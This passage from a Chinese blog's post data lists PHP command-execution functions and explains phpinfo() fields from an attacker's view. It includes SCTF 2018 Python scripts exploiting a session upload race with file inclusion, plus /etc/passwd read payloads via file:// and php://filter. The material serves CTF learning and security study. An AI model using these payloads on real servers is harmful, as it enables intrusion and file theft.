PHP 环境配置参数 \n13. ini_restore          可用于恢复 PHP 环境配置参数到其初始值。\n14. dl()                       在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。\n15. pfsockopen         建立一个 Internet 或 UNIX 域的 socket 持久连接。\n16. fsocket\n17. readlink           返回符号连接指向的目标文件内容\n18. symlink            在 UNIX 系统中建立一个符号链接。\n19. stream_socket_server             建立一个 Internet 或 UNIX 服务器连接\n20. putenv                    用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。","slug":"php命令执行函数","published":1,"updated":"2018-07-15T02:41:59.869Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12hl000vqkdlzybu9ln1","content":"<p>代码或命令执行函数：</p>\n<ol>\n<li>system                    允许执行一个外部程序并回显输出，类似于 passthru() </li>\n<li>shell_exec</li>\n<li>exec                        允许执行一个外部程序 </li>\n<li>curl_exec</li>\n<li>popen               可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。</li>\n<li>proc_open               执行一个命令并打开文件指针用于读取以及写入 </li>\n<li>passthru                   允许执行一个外部程序并回显输出 </li>\n<li>pcntl_exec</li>\n<li>popepassthru </li>\n<li>assert</li>\n<li>eval</li>\n<li>preg_replace              \\e修饰符          PHP 5.5.0 起， 传入 “\\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\\e” 也无法起效。 </li>\n<li>create_functioin            创建一个匿名函数。  </li>\n<li>call_user_func             把第一个参数作为回调函数调用  </li>\n<li>call_user_func_array      调用回调函数，并把一个数组参数作为回调函数的参数  </li>\n</ol>\n<p>其他:</p>\n<ol>\n<li>scandir</li>\n<li>glob                 列目录</li>\n<li>phpinfo</li>\n<li>chroot                   可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式 PHP 时才能工作，且该函数不适用于 Windows 系统。 </li>\n<li>chgrp                   改变文件或目录所属的用户组 </li>\n<li>chown                  改变文件或目录的所有者 </li>\n<li>error_log                将错误信息发送到指定位置（文件)，在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode， 执行任意命令 </li>\n<li>openlog</li>\n<li>syslog                 可调用 UNIX 系统的系统层 syslog() 函数。</li>\n<li>proc_get_status    获取使用 proc_open() 所打开进程的信息    </li>\n<li>ini_alter                是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同 </li>\n<li>ini_set                  可用于修改、设置 PHP 环境配置参数 </li>\n<li>ini_restore          可用于恢复 PHP 环境配置参数到其初始值。</li>\n<li>dl()                       在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。</li>\n<li>pfsockopen         建立一个 Internet 或 UNIX 域的 socket 持久连接。</li>\n<li>fsocket</li>\n<li>readlink           返回符号连接指向的目标文件内容</li>\n<li>symlink            在 UNIX 系统中建立一个符号链接。</li>\n<li>stream_socket_server             建立一个 Internet 或 UNIX 服务器连接</li>\n<li>putenv                    用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<p>代码或命令执行函数：</p>\n<ol>\n<li>system                    允许执行一个外部程序并回显输出，类似于 passthru() </li>\n<li>shell_exec</li>\n<li>exec                        允许执行一个外部程序 </li>\n<li>curl_exec</li>\n<li>popen               可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。</li>\n<li>proc_open               执行一个命令并打开文件指针用于读取以及写入 </li>\n<li>passthru                   允许执行一个外部程序并回显输出 </li>\n<li>pcntl_exec</li>\n<li>popepassthru </li>\n<li>assert</li>\n<li>eval</li>\n<li>preg_replace              \\e修饰符          PHP 5.5.0 起， 传入 “\\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\\e” 也无法起效。 </li>\n<li>create_functioin            创建一个匿名函数。  </li>\n<li>call_user_func             把第一个参数作为回调函数调用  </li>\n<li>call_user_func_array      调用回调函数，并把一个数组参数作为回调函数的参数  </li>\n</ol>\n<p>其他:</p>\n<ol>\n<li>scandir</li>\n<li>glob                 列目录</li>\n<li>phpinfo</li>\n<li>chroot                   可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式 PHP 时才能工作，且该函数不适用于 Windows 系统。 </li>\n<li>chgrp                   改变文件或目录所属的用户组 </li>\n<li>chown                  改变文件或目录的所有者 </li>\n<li>error_log                将错误信息发送到指定位置（文件)，在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode， 执行任意命令 </li>\n<li>openlog</li>\n<li>syslog                 可调用 UNIX 系统的系统层 syslog() 函数。</li>\n<li>proc_get_status    获取使用 proc_open() 所打开进程的信息    </li>\n<li>ini_alter                是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同 </li>\n<li>ini_set                  可用于修改、设置 PHP 环境配置参数 </li>\n<li>ini_restore          可用于恢复 PHP 环境配置参数到其初始值。</li>\n<li>dl()                       在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。</li>\n<li>pfsockopen         建立一个 Internet 或 UNIX 域的 socket 持久连接。</li>\n<li>fsocket</li>\n<li>readlink           返回符号连接指向的目标文件内容</li>\n<li>symlink            在 UNIX 系统中建立一个符号链接。</li>\n<li>stream_socket_server             建立一个 Internet 或 UNIX 服务器连接</li>\n<li>putenv                    用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。</li>\n</ol>\n"},{"title":"phpinfo解读","date":"2018-05-22T06:35:41.000Z","password":654321,"_content":"\n# phpinfo解读\n\n<!--more-->\n\n我们以 [链接：](http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php)[phpinfo()](http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php) 为例来讲解吧。\n\n## 版本更迭\n\nphpinfo里最显眼的信息，也就是其标题（图1），其中包含PHP的版本信息。 PHP 5.6 是官方最后一个支持的PHP 5版本，不过，这个版本也已经于2017年1月19号停止功能性更新，只提供安全更新。到2018年12月31号为止，PHP 5.6也将完全终止更新，PHP5彻底退出历史舞台。\n\n PHP7里提供了很多更好用的语法、函数，也极大改进了安全性。举几个简单的例子：\n\n1. 移除不支持SQL预编译的Mysql扩展：mysql \n2. 移除preg_replace中容易导致代码执行漏洞的正则模式：e \n3. assert从一个函数变成一个语法结构（类似eval，无法再动态调用。至此，大量PHP一句话木马将失效），7.2中废弃字符串形式的参数 \n4. hex字符串（如0xf4c3b00c）不再被作为数字，is_numeric也不再认可，可见 [链接：https://3v4l.org/ORuc7](https://3v4l.org/ORuc7) \n5. 7.2中废弃可以动态执行字符串的 create_function \n6. 7.2中废弃容易导致变量覆盖的无第二个参数的parse_str \n7. 移除`<script language=\"php\"\\>`和`<%`，这两种另类的PHP标签 \n8. 移除dl函数\n\n这里是关于PHP版本支持的一些说明 [链接：](http://php.net/supported-versions.php)[PHP: Supported Versions](http://php.net/supported-versions.php) PHP5从5.2到5.6，其实也做了很多改进，以前分享过一篇文章 [链接：](http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html)[php各版本的姿势(2017-02-15更新) - l3m0n - 博客园](http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html) 大家可以再温故一下，我就不再介绍了。\n\n和版本有关的一些tricks：\n\n- [链接：](https://tricking.io/card/26/description)[梧桐百科 - 碎片化知识学习](https://tricking.io/card/26/description) - \n- [链接：](https://tricking.io/card/24/description)[梧桐百科 - 碎片化知识学习](https://tricking.io/card/24/description) - \n- [链接：](https://tricking.io/card/2/description)[梧桐百科 - 碎片化知识学习](https://tricking.io/card/2/description) \n\n这个两个在线工具可以用来在PHP多版本（包括小版本）中执行代码，进而比较他们之前的区别： \n\n- [链接：](https://3v4l.org/)[Online PHP editor | Run code in 200  PHP & HHVM ve...](https://3v4l.org/) \n- [链接：](http://sandbox.onlinephpfunctions.com/)[PHP Sandbox, test PHP online, PHP tester](http://sandbox.onlinephpfunctions.com/)\n\n## php.ini\n\n图1中的四项配置，与php.ini有关。\n\n图一:\n\n![](https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png)\n\n php.ini是php的配置文件，但其实并不一定每个php环境都会有这个文件。比如我图1中的这个环境，其“Loaded Configuration File”的值是“(none)”，其实就是没有。如果我们没有指定php.ini文件，那么php的所有配置都会使用默认配置。 \n\n这里有一点值得注意，那就是“默认配置”的含义： \n\n1. 没有任何php.ini时，某个配置项默认的值 \n2. 用apt等源管理工具安装php后，默认php.ini里配置的值 \n\n上述两个“默认配置”在大部分情况下是相同的，但还是有些许不同。 举个简单的例子，配置项request_order用来指定PHP的\\$_REQUEST变量以何种顺序取值。《Discuz! 6.x/7.x 全局变量防御绕过导致代码执行》（ [链接：](https://www.secpulse.com/archives/2338.html)[Discuz! 6.x/7.x 全局变量防御绕过导致命令执行 - SecPulse.COM | 安全...](https://www.secpulse.com/archives/2338.html) ） 就与这个配置有关。 (Discuz那个链接看着有点迷糊，我看的这个[链接：](http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html)[Discuz!某两个版本前台产品命令执行（无需登录） | WooYun-2014-80723 | W...](http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html))。\n\n文中提到，因为PHP5.3以后request_order的默认值变成GP，不再包含\\$\\_COOKIE，所以导致通过\\$_COOKIE来覆盖变量，造成代码执行。\n\n 其实文中说的request_order默认值变成GP，指的是第2种情况。也就是说，如果一个完全没有任何php.ini文件的php环境，其默认的request_order，仍然是GPC，而非GP。 我们可以来实验一下，首先用docker启动一个php环境（docker的php环境是没有php.ini的）： \n\n> docker run --rm --name php1 -it -p 8080:80 -v `pwd`:/var/www/html php:7.2-apache \n\n再用docker启动一个默认的debian环境，并用apt源安装php5：\n\n> docker run --rm --name php2 -it -p 8081:80 -v `pwd`:/var/www/html debian:8 bash apt-get update && apt-get install -y php5 \n>\n> php -S 0.0.0.0:80 -t /var/www/html \n\n然后，我们输出一下两个环境的request_order取值，以及\\$\\_REQUEST变量：图2。 可见，在request_order为空的时候，\\$\\_REQUEST可以取到$_COOKIE中的值；而request_order=GP的时候，就已经取不到了。我们查看第二个环境的php.ini文件，也可以看到request_order的取值：图3。\n\n 所以，这两种默认值的含义，需要区分清楚，避免出现错误。\n\n图二:\n\n![](https://file.zsxq.com/1d6/59/d659ac1a237468325de98f2cfc0802548d77e8a7ebd9d1a80d0390d2d0b2b7e2.png)\n\n图三:\n\n![](https://file.zsxq.com/164/c8/64c85402cb752d1d7a5a2fbec6bf434338de9526b3836c08c28cb9382609a720.png)\n\nwin10: 本地win10+phpstudy+apache中5.3.29-nts与5.4.45-nts中的requests_order方式是\"CGP\"\n\n除了默认php配置，还有两个配置项我没说。在编译PHP的时候，我们可以指定--with-config-file-path和--with-config-file-scan-dir。`\n\n 这两个配置项的意思是，PHP会在--with-config-file-path指定的目录下寻找php.ini文件，如果找到则加载之；除此之外，PHP还会在--with-config-file-scan-dir指定的目录下，寻找所有以.ini为后缀的文件，加载其为配置文件，这个配置是可以覆盖php.ini中配置的。 所以，通常用apt-get install php-pdo来安装php扩展，都会在--with-config-file-scan-dir下写入新的配置文件，而不是修改php.ini。 \n\n这样，我们如果遇到phpinfo页面，即可用过这两个配置项，来定位php.ini以及额外配置文件的位置。甚至来说，如果这两个目录可写，我们就能写入自己的php配置，进而达成跨站、提权等目的。\n\n图四:\n\n![](https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png)\n\n\n\n## SAPI\n\n见图5，Server API 指的是当前PHP运行在哪一种模式下。SAPI是PHP内核的一个概念，相当于是PHP核心解释器和应用层（如Web中间件）的一个桥梁。我们需要在SAPI里实现一些函数，供PHP底层调用。 \n\n这篇文章（ [链接：](https://foio.github.io/php-sapi/)[理解php内核中SAPI的作用 – 积木村の研究所](https://foio.github.io/php-sapi/) ）里举了个简单的例子：cli和cgi这两个SAPI，均需要实现sapi_cgi_read_cookies函数，但cli模式下没有cookie，所以该函数返回null；cgi模式下，cookie从HTTP头中获取，所以返回的是getenv(\"HTTP_COOKIE\")。 \n\n下面介绍一些常用的SAPI。 图5中的FPM/FastCGI指的就是一种SAPI，其提供了一种以fastcgi协议和Web中间件（如Nginx）通信的接口，具体流程可以阅读我的这篇文章（ [链接：](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)[Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写 | 离别歌](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)  ）。\n\n图5:\n\n![](https://file.zsxq.com/1a0/72/a072352975fb3a7f091f12f1f51c359d246c1ea1dded3a33be4300fc81d143c8.png)\n\n PHP为Apache提供了一个专用了SAPI——Apache 2.0 Handler。相当于是把PHP编译成一个动态链接库，作为Apache的一个模块。\n\n 当然，Apache也不一定必须用这种SAPI，他同样也支持用Fastcgi和PHP-FPM通信。所以，即使你在实战中遇到了服务器是Apache的环境，也不能就此认定其一定存在Apache模块。你可以尝试下载一个PHPStudy，来看看是否有apache_get_version函数，答案是否定的。 我们平时在命令行里运行PHP，比如php -i （在命令行下执行phpinfo的方法），你可以看到此时的Server API是“Command Line Interface”：图6。\n\n图6:\n\n![](https://file.zsxq.com/1b6/61/b661242ec92dae5334dd695b75c7a3ad2f8a028c8cbc59151eec9230cc7d9a45.png)\n\n这个SAPI就是给命令行用的。 \n\n另外，PHP5.4及以后，我们可以用 php -S localhost:8080 来启动PHP内置的Web server。这个Web server其实也是一个SAPI，名为“Built-in HTTP server”：图7。 \n\n图7:\n\n![PHP](https://file.zsxq.com/1b2/bb/b2bbf2fcb9f5d5088f55dc290570ba84f8c0cc86af9786bbaa5b02b77372fdb8.png) \n\nBuilt-in Server相当于实现了一个Web文件服务器，然后将PHP有关的请求发给“Built-in HTTP server”这个SAPI，最终交给解释器解析。 \n\n在很古老的时候，rfc3875（ [链接：http://www.ietf.org/rfc/rfc3875](http://www.ietf.org/rfc/rfc3875) ）定义了一种运行Web应用的方法——CGI，PHP也为其提供了名为“CGI/FastCGI”的SAPI，不过用的比较少，不介绍了。 \n\n除此之外，还有一个比较有意思的SAPI，叫embed，这是一个嵌入式SAPI。这个功能就很有意思了，我们能很容易地将PHP解释器集成到自己的程序里。比如Laruence在08年曾写过一篇《使用PHP Embed SAPI实现Opcodes查看器》的文章：[链接：](http://www.laruence.com/2008/09/23/539.html)[使用PHP Embed SAPI实现Opcodes查看器 | 风雪之隅](http://www.laruence.com/2008/09/23/539.html) 。 \n\n原理也比较简单，就是在外部调用PHP内核的zend_compile_file函数，将代码转换成OPCODE，然后输出。\n\n uwsgi的PHP插件，也是利用内嵌embed的PHP，我们可以在 [链接：](https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile)[vulhub/Dockerfile at master · vulhub/vulhub · GitH...](https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile) 看到整个编译的过程。 \n\nphpdbg是php5.4及以后加入的一个php交互式调试器，他也是一个sapi。\n\n## php支持的协议\n\n图8，Registered PHP Streams中列出了PHP默认支持的一些协议。 我们来一一介绍一下。 \n\nhttps和http自然不用说，用来包装http协议，我们可以执行readfile('[链接：](http://www.example.com/)[Example Domain](http://www.example.com/)');来发送一个http请求。 \n\nftps和ftp，用来包装ftp协议，和http类似。 \n\ncompress.zlib用来处理zlib压缩过的数据，比如我们可以用readfile('compress.zlib://file.gz');来读取用zlib压缩过的文件。 \n\nphp是php特有的协议，用其可以访问输入输出流，并进行过滤、编码等操作。其支持的功能有很多，可以参考这个文档：[链接：](http://php.net/manual/zh/wrappers.php.php)[PHP: php:// - Manual](http://php.net/manual/zh/wrappers.php.php) \n\nfile用来访问本地文件，比如readfile('file:///etc/passwd');\n\n glob用来以模式匹配的方式访问本地目录，比如 dir('glob:///etc/*')。 \n\ndata可以用url的方式来模拟一个输入流（RFC 2397），比如，readfile通常是用来读取文件中的内容，但我们可以通过 readfile('data://text/plain;base64,SGVsbG8='); 来解码base64串，并将其作为输入流读取。 \n\nphar是用来读写PHP归档，PHP归档类似于Java的.jar文件，我们可以将一个完整的PHP项目（可能包含数百个文件）打包成一个.phar，比如composer.phar。phar流就负责读写这个文件。\n\n 除此之外，常见的协议还有zip://，用来读写zip格式的压缩文件；\n\ncompress.bzip2://用来读写bz2压缩的文件。这些协议可能需要额外安装扩展。\n\n另外，用户也可以定义自己的流，即实现streamWrapper类中的方法，这块我就不介绍了。\n\n图8:\n\n![](https://file.zsxq.com/179/b6/79b6f16973ae9a0c370e62e0f7fa11f401121107e39d1ac9bc0e6a486ba8075d.png)\n\n## Registered Stream Filters\n\nRegistered Stream Filters列出了一些默认支持的filter流。（图9） 其实PHP中的filter流，是和协议密不可分的。协议的作用是读写文件（包括正常文件、目录、输入输出等），而filter流的作用就是在读写的中途对数据进行过滤和编码，相当于是一个HOOK。 \n\nzlib.\\*用来压缩和解压数据，和compress.zlib://协议不同的是，用zlib流可以压缩、解压任何其他协议里传输的数据。 \n\nconvert.iconv.\\*用来转换编码。 \n\nstring.\\*用来做字符串转换，比如string.strip_tags用来去除字符串中的标签，string.tolower用来将字符串转换成小写。 \n\nconvert.\\*用来转换数据，比如用convert.base64-decode可以做base64的解码。其实我觉得放在string.*里也可以。 \n\ndechunk用来处理chunk相关的数据，chunk是HTTP1.1中传输流式数据的方式（ [链接：](https://en.wikipedia.org/wiki/Chunked_transfer_encoding)[Chunked transfer encoding - Wikipedia](https://en.wikipedia.org/wiki/Chunked_transfer_encoding) ），用这个filter流就能将chunk解开。 consumed应该是用来计算数据字符数量的。\n\n 在PHP里，我们可以用stream_filter_append函数将上述流，附加在某个输入输出资源上。当然，更常见的用法是，我们可以用php://filter协议来使用上述流，比如 readfile('php://filter/read=convert.base64-encode/resource=/etc/passwd'); 关于php://filter的一些有趣的技巧，可以阅读这篇文章 [链接：](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)[谈一谈php://filter的妙用 | 离别歌](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)  。\n\n图9:\n\n![](https://file.zsxq.com/142/62/426224a833018047b952319a5e72bea0f85227707d522c748fa533acf12f6b17.png)\n\n## session uplaod\n\n图10:\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7ddab932-75fc-1.png)\n\n`session.upload_progress.enabled = on` 说明可以覆盖session\n\n`clean up`说明需要竞争\n\n图11：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7dcda382-75fc-1.png)\n\nsessionupload.py\n\n```\n#!coding:utf-8\nimport requests\nimport time\n\nurl = 'http://116.62.71.206:52872/?f=login.php'\ndata = {'name':'admin','pass':'sctf2018_h656cDBkU2'}\n\nr = requests.post(url,data = data)\nPHPSESSID = r.cookies['PHPSESSID']\nprint 'input the PHPSESSID in include.py' +'\\n' + PHPSESSID\ntime.sleep(10)\n\nwhile 1:\n    url = 'http://116.62.71.206:52872/?f=upload_sctf2018_C9f7y48M75.php'\n    files = { \n    \"PHP_SESSION_UPLOAD_PROGRESS\" : (None,'<?php echo file_get_contents(\"/tmp/flag_56CcE97QGNxDEXNpW3HY\");?>'),  \n\n    \"upload\" : (\"tmp.jpg\", open(\"tmp.png\", \"rb\"), \"image/png\"), \n\n    \"submit\" : (None,\"submit\")\n    }  \n    #proxies = {'http':'http://127.0.0.1:8080'}\n    headers = {'Cookie':'PHPSESSID=' + PHPSESSID}\n    r = requests.post(url,files = files , headers = headers)\n    print r.text\n    print PHPSESSID\n    #开了cleanup，需要竞争，并且保持回话的session\n```\n\ninclude.py\n\n```\n#!coding:utf-8\n\nimport requests\nPHPSESSID = 'qc2kavokdjiiepu283hduivod2'\nwhile 1:\n    url = 'http://116.62.71.206:52872/?f=aa://../../../../var/lib/php/sessions/sess_' + PHPSESSID\n    print url\n    r = requests.get(url)\n    if 'SCTF' in r.text:\n        print r.text\n        break\n```\n\n\n\n## 案例\n\n以前我在博客里讲过不少和协议有关的安全tricks，大家也分享过一些，今天来温故一下。 \n\n利用php filter绕过死亡exit：[链接：](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)[谈一谈php://filter的妙用 | 离别歌](https://www.leavesongs.com/PENETRATION/php-filter-magic.html) \n\n利用phar/zip协议绕过有后缀的文件包含：include zip:///var/www/html/upload/1.gif#1.php \n\n利用curl+gopher协议进行SSRF漏洞利用： [链接：](http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html)[Do Evil Things with gopher://](http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html) \n\nSSRF检查host时进行文件读取：file://localhost/etc/passwd \n\n利用php协议+zlib.inflate流压缩数据，突破libxml解析器限制的实体长度 \n\nphp://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd","source":"_posts/phpinfo解读.md","raw":"---\ntitle: phpinfo解读\ndate: 2018-05-22 14:35:41\ntags: web\npassword: 654321\n---\n\n# phpinfo解读\n\n<!--more-->\n\n我们以 [链接：](http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php)[phpinfo()](http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php) 为例来讲解吧。\n\n## 版本更迭\n\nphpinfo里最显眼的信息，也就是其标题（图1），其中包含PHP的版本信息。 PHP 5.6 是官方最后一个支持的PHP 5版本，不过，这个版本也已经于2017年1月19号停止功能性更新，只提供安全更新。到2018年12月31号为止，PHP 5.6也将完全终止更新，PHP5彻底退出历史舞台。\n\n PHP7里提供了很多更好用的语法、函数，也极大改进了安全性。举几个简单的例子：\n\n1. 移除不支持SQL预编译的Mysql扩展：mysql \n2. 移除preg_replace中容易导致代码执行漏洞的正则模式：e \n3. assert从一个函数变成一个语法结构（类似eval，无法再动态调用。至此，大量PHP一句话木马将失效），7.2中废弃字符串形式的参数 \n4. hex字符串（如0xf4c3b00c）不再被作为数字，is_numeric也不再认可，可见 [链接：https://3v4l.org/ORuc7](https://3v4l.org/ORuc7) \n5. 7.2中废弃可以动态执行字符串的 create_function \n6. 7.2中废弃容易导致变量覆盖的无第二个参数的parse_str \n7. 移除`<script language=\"php\"\\>`和`<%`，这两种另类的PHP标签 \n8. 移除dl函数\n\n这里是关于PHP版本支持的一些说明 [链接：](http://php.net/supported-versions.php)[PHP: Supported Versions](http://php.net/supported-versions.php) PHP5从5.2到5.6，其实也做了很多改进，以前分享过一篇文章 [链接：](http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html)[php各版本的姿势(2017-02-15更新) - l3m0n - 博客园](http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html) 大家可以再温故一下，我就不再介绍了。\n\n和版本有关的一些tricks：\n\n- [链接：](https://tricking.io/card/26/description)[梧桐百科 - 碎片化知识学习](https://tricking.io/card/26/description) - \n- [链接：](https://tricking.io/card/24/description)[梧桐百科 - 碎片化知识学习](https://tricking.io/card/24/description) - \n- [链接：](https://tricking.io/card/2/description)[梧桐百科 - 碎片化知识学习](https://tricking.io/card/2/description) \n\n这个两个在线工具可以用来在PHP多版本（包括小版本）中执行代码，进而比较他们之前的区别： \n\n- [链接：](https://3v4l.org/)[Online PHP editor | Run code in 200  PHP & HHVM ve...](https://3v4l.org/) \n- [链接：](http://sandbox.onlinephpfunctions.com/)[PHP Sandbox, test PHP online, PHP tester](http://sandbox.onlinephpfunctions.com/)\n\n## php.ini\n\n图1中的四项配置，与php.ini有关。\n\n图一:\n\n![](https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png)\n\n php.ini是php的配置文件，但其实并不一定每个php环境都会有这个文件。比如我图1中的这个环境，其“Loaded Configuration File”的值是“(none)”，其实就是没有。如果我们没有指定php.ini文件，那么php的所有配置都会使用默认配置。 \n\n这里有一点值得注意，那就是“默认配置”的含义： \n\n1. 没有任何php.ini时，某个配置项默认的值 \n2. 用apt等源管理工具安装php后，默认php.ini里配置的值 \n\n上述两个“默认配置”在大部分情况下是相同的，但还是有些许不同。 举个简单的例子，配置项request_order用来指定PHP的\\$_REQUEST变量以何种顺序取值。《Discuz! 6.x/7.x 全局变量防御绕过导致代码执行》（ [链接：](https://www.secpulse.com/archives/2338.html)[Discuz! 6.x/7.x 全局变量防御绕过导致命令执行 - SecPulse.COM | 安全...](https://www.secpulse.com/archives/2338.html) ） 就与这个配置有关。 (Discuz那个链接看着有点迷糊，我看的这个[链接：](http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html)[Discuz!某两个版本前台产品命令执行（无需登录） | WooYun-2014-80723 | W...](http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html))。\n\n文中提到，因为PHP5.3以后request_order的默认值变成GP，不再包含\\$\\_COOKIE，所以导致通过\\$_COOKIE来覆盖变量，造成代码执行。\n\n 其实文中说的request_order默认值变成GP，指的是第2种情况。也就是说，如果一个完全没有任何php.ini文件的php环境，其默认的request_order，仍然是GPC，而非GP。 我们可以来实验一下，首先用docker启动一个php环境（docker的php环境是没有php.ini的）： \n\n> docker run --rm --name php1 -it -p 8080:80 -v `pwd`:/var/www/html php:7.2-apache \n\n再用docker启动一个默认的debian环境，并用apt源安装php5：\n\n> docker run --rm --name php2 -it -p 8081:80 -v `pwd`:/var/www/html debian:8 bash apt-get update && apt-get install -y php5 \n>\n> php -S 0.0.0.0:80 -t /var/www/html \n\n然后，我们输出一下两个环境的request_order取值，以及\\$\\_REQUEST变量：图2。 可见，在request_order为空的时候，\\$\\_REQUEST可以取到$_COOKIE中的值；而request_order=GP的时候，就已经取不到了。我们查看第二个环境的php.ini文件，也可以看到request_order的取值：图3。\n\n 所以，这两种默认值的含义，需要区分清楚，避免出现错误。\n\n图二:\n\n![](https://file.zsxq.com/1d6/59/d659ac1a237468325de98f2cfc0802548d77e8a7ebd9d1a80d0390d2d0b2b7e2.png)\n\n图三:\n\n![](https://file.zsxq.com/164/c8/64c85402cb752d1d7a5a2fbec6bf434338de9526b3836c08c28cb9382609a720.png)\n\nwin10: 本地win10+phpstudy+apache中5.3.29-nts与5.4.45-nts中的requests_order方式是\"CGP\"\n\n除了默认php配置，还有两个配置项我没说。在编译PHP的时候，我们可以指定--with-config-file-path和--with-config-file-scan-dir。`\n\n 这两个配置项的意思是，PHP会在--with-config-file-path指定的目录下寻找php.ini文件，如果找到则加载之；除此之外，PHP还会在--with-config-file-scan-dir指定的目录下，寻找所有以.ini为后缀的文件，加载其为配置文件，这个配置是可以覆盖php.ini中配置的。 所以，通常用apt-get install php-pdo来安装php扩展，都会在--with-config-file-scan-dir下写入新的配置文件，而不是修改php.ini。 \n\n这样，我们如果遇到phpinfo页面，即可用过这两个配置项，来定位php.ini以及额外配置文件的位置。甚至来说，如果这两个目录可写，我们就能写入自己的php配置，进而达成跨站、提权等目的。\n\n图四:\n\n![](https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png)\n\n\n\n## SAPI\n\n见图5，Server API 指的是当前PHP运行在哪一种模式下。SAPI是PHP内核的一个概念，相当于是PHP核心解释器和应用层（如Web中间件）的一个桥梁。我们需要在SAPI里实现一些函数，供PHP底层调用。 \n\n这篇文章（ [链接：](https://foio.github.io/php-sapi/)[理解php内核中SAPI的作用 – 积木村の研究所](https://foio.github.io/php-sapi/) ）里举了个简单的例子：cli和cgi这两个SAPI，均需要实现sapi_cgi_read_cookies函数，但cli模式下没有cookie，所以该函数返回null；cgi模式下，cookie从HTTP头中获取，所以返回的是getenv(\"HTTP_COOKIE\")。 \n\n下面介绍一些常用的SAPI。 图5中的FPM/FastCGI指的就是一种SAPI，其提供了一种以fastcgi协议和Web中间件（如Nginx）通信的接口，具体流程可以阅读我的这篇文章（ [链接：](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)[Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写 | 离别歌](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)  ）。\n\n图5:\n\n![](https://file.zsxq.com/1a0/72/a072352975fb3a7f091f12f1f51c359d246c1ea1dded3a33be4300fc81d143c8.png)\n\n PHP为Apache提供了一个专用了SAPI——Apache 2.0 Handler。相当于是把PHP编译成一个动态链接库，作为Apache的一个模块。\n\n 当然，Apache也不一定必须用这种SAPI，他同样也支持用Fastcgi和PHP-FPM通信。所以，即使你在实战中遇到了服务器是Apache的环境，也不能就此认定其一定存在Apache模块。你可以尝试下载一个PHPStudy，来看看是否有apache_get_version函数，答案是否定的。 我们平时在命令行里运行PHP，比如php -i （在命令行下执行phpinfo的方法），你可以看到此时的Server API是“Command Line Interface”：图6。\n\n图6:\n\n![](https://file.zsxq.com/1b6/61/b661242ec92dae5334dd695b75c7a3ad2f8a028c8cbc59151eec9230cc7d9a45.png)\n\n这个SAPI就是给命令行用的。 \n\n另外，PHP5.4及以后，我们可以用 php -S localhost:8080 来启动PHP内置的Web server。这个Web server其实也是一个SAPI，名为“Built-in HTTP server”：图7。 \n\n图7:\n\n![PHP](https://file.zsxq.com/1b2/bb/b2bbf2fcb9f5d5088f55dc290570ba84f8c0cc86af9786bbaa5b02b77372fdb8.png) \n\nBuilt-in Server相当于实现了一个Web文件服务器，然后将PHP有关的请求发给“Built-in HTTP server”这个SAPI，最终交给解释器解析。 